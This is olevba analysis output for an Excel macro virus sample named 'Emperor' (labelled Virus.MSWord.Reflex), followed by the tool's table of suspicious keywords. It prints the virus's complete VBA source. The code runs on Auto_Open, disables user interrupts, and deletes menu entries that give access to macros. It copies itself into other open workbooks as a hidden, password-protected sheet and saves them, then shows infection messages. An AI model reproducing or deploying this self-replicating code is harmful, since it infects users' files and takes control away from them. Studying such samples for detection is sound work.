olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Reflex-7426e351630d6d0cbbd8c7f9c1eddf8089620e24
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Emperor23.bas 
in file: Virus.MSWord.Reflex-7426e351630d6d0cbbd8c7f9c1eddf8089620e24 - OLE stream: '1/_VBA_PROJECT_CUR/VBA/Emperor23'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Option Private Module
Sub keyplus()
    Application.EnableCancelKey = xlDisabled
    Application.OnKey "{ESCAPE}", ""
    Application.OnKey "^{BREAK}", ""
End Sub

Sub Auto_Open()
vd: On Error GoTo vd
    Application.ScreenUpdating = flase
    Call check_file
    Application.Interactive = True
    Application.ScreenUpdating = True
    End
End Sub

Sub check_file()
    Application.ScreenUpdating = flase
    Application.Interactive = flase
    Application.EnableCancelKey = xlDisabled
    mn$ = "Emperor"
    mn2$ = mn$ + LTrim$(Str$(Day(Date)))
    Randomize: pd1 = Int((26 * Rnd) + 1): pd2 = Int((26 * Rnd) + 1)
    pd$ = LTrim$(Str$(pd1)) + LTrim$(Str$(pd2))
    num = Workbooks.Count: vir1 = 1
    ReDim ck(num), fi(num)
    For i = 1 To num
        Select Case Windows(Workbooks(i).Name).Visible
               Case flase
                    n1$ = ActiveWorkbook.Name: ck(i) = 1
                    Windows(Workbooks(i).Name).Visible = True
                    Workbooks(n1$).Activate
               Case True
                    n1$ = ActiveWorkbook.Name
        End Select
    Next
    For i = 1 To Workbooks(n1$).Modules.Count
        vn$ = Workbooks(n1$).Modules(i).Name
        If Left$(vn$, 7) = mn$ Then mn1$ = vn$: GoTo lv
    Next
lv: If InStr(MenuBars(xlWorksheet).Menus(3).MenuItems(3).Caption, "工具列") > 0 Then
        MenuBars(xlWorksheet).Reset
        MenuBars(xlModule).Reset
        MenuBars(xlWorksheet).Menus(3).MenuItems(3).Delete
        MenuBars(xlWorksheet).Menus(5).MenuItems(4).Delete
        MenuBars(xlWorksheet).Menus(6).MenuItems(7).Delete
        MenuBars(xlModule).Menus(2).MenuItems(11).Delete
        MenuBars(xlModule).Menus(3).MenuItems(3).Delete
        MenuBars(xlModule).Menus(6).MenuItems(14).Delete
        MenuBars(xlModule).Menus(6).MenuItems(6).Delete
    End If
    For i = 1 To num
        n2$ = Workbooks(i).Name: If Right$(n2$, 4) <> ".XLS" Then fi(i) = 1: GoTo lc
        If n1$ <> n2$ Then
           num1 = Workbooks(i).Modules.Count
           Select Case num1
                  Case 0
                  Case Else
                       For j = 1 To num1
                           If Left$(Workbooks(i).Modules(j).Name, 7) = mn$ Then vir1 = vir1 + 1: GoTo lc
                       Next
           End Select
           Call write_virus(pd$, mn1$, mn2$, n1$, n2$)
        End If
lc: Next
    For i = 1 To num
        If ck(i) = 1 Then Windows(Workbooks(i).Name).Visible = False
    Next
    Workbooks(n1$).Activate
    For i = 1 To num
        If fi(i) = 0 Then Workbooks(i).Save
    Next
    If Day(Date) = 1 Or Day(Date) = 15 Then vir2 = 1
    If WeekDay(Date) = 2 Then vir2 = 1
    Randomize: vir = Int((3 * Rnd) + 1)
    Select Case vir
           Case 1: If vir1 = num Then Call run_virus
           Case 2: If vir2 = 1 Then Call run_virus
           Case 3: If vir1 = num And vir2 = 1 Then Call run_virus
    End Select
End Sub

Sub write_virus(pd$, mn1$, mn2$, n1$, n2$)
    Application.ScreenUpdating = flase
    Application.Interactive = flase
    Application.EnableCancelKey = xlDisabled
    Workbooks(n1$).Sheets(mn1$).Visible = True
    Workbooks(n1$).Sheets(mn1$).Copy before:=Workbooks(n2$).Sheets(1)
    Workbooks(n2$).Sheets(mn1$).Name = mn2$
    Toolbars("Visual Basic").Visible = False
    Sheets(mn2$).Protect password:=pd$
    Workbooks(n1$).Sheets(mn1$).Visible = False
    Workbooks(n2$).Sheets(mn2$).Visible = False
End Sub

Sub run_virus()
    Application.ScreenUpdating = flase
    Application.Interactive = flase
    Application.EnableCancelKey = xlDisabled
    vn1$ = "此Excel巨集病毒僅供研究用，並無破壞性。"
    vn2$ = "提醒您平時養成良好的電腦操作習慣" + Chr$(13) + Chr$(13) + "，對來路不明的檔案勿亂拷背、開啟。"
    vn3$ = Chr$(84) + Chr$(104) + Chr$(101) + Chr$(32) + Chr$(70) + Chr$(105) + Chr$(114) + Chr$(115) + Chr$(116) + Chr$(32) + Chr$(69) + Chr$(109) + Chr$(112) + Chr$(101) + Chr$(114) + Chr$(111) + Chr$(114) + Chr$(32) + Chr$(86) + Chr$(101) + Chr$(114) + Chr$(32) + Chr$(49) + Chr$(46) + Chr$(48) + Chr$(48) + " [02/29/1997]"
    MsgBox "恭喜！您的Excel檔已經中毒了。", 64, vn3$
    MsgBox vn1$, 64, vn3$
    MsgBox vn2$, 64, vn3$
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
+----------+--------------------+---------------------------------------------+

